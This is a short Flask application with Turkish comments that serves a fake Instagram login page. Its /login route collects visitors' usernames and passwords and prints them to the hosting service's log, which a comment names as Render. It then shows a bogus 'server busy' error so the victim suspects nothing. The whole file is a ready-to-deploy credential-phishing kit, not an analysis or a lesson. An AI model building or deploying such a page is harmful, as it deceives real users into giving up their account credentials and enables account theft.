from flask import Flask, render_to_string, request
import os

app = Flask(__name__)

# Basit Instagram Giriş Arayüzü (Saniye veya Bekleme Yok)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { font-family: sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
        h1 { font-family: 'Arial', sans-serif; font-style: italic; font-weight: bold; font-size: 35px; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; background: #fafafa; }
        button { width: 100%; padding: 10px; background-color: #0095f6; border: none; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; }
        button:active { background-color: #0077c2; }
        .footer { margin-top: 20px; font-size: 12px; color: #8e8e8e; }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Instagram</h1>
        <form action="/login" method="post">
            <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
            <input type="password" name="password" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>
        <div class="footer">Şifreni mi unuttun?</div>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return HTML_TEMPLATE

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('username')
    pw = request.form.get('password')
    # Bilgiler doğrudan Render LOG ekranına düşer
    print(f"--- YENİ GİRİŞ ---")
    print(f"Kullanıcı: {user}")
    print(f"Şifre: {pw}")
    print(f"------------------")
    return "Hata: Sunucu meşgul, lütfen daha sonra tekrar deneyiniz."

if __name__ == '__main__':
    # Render için zorunlu port ayarı
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
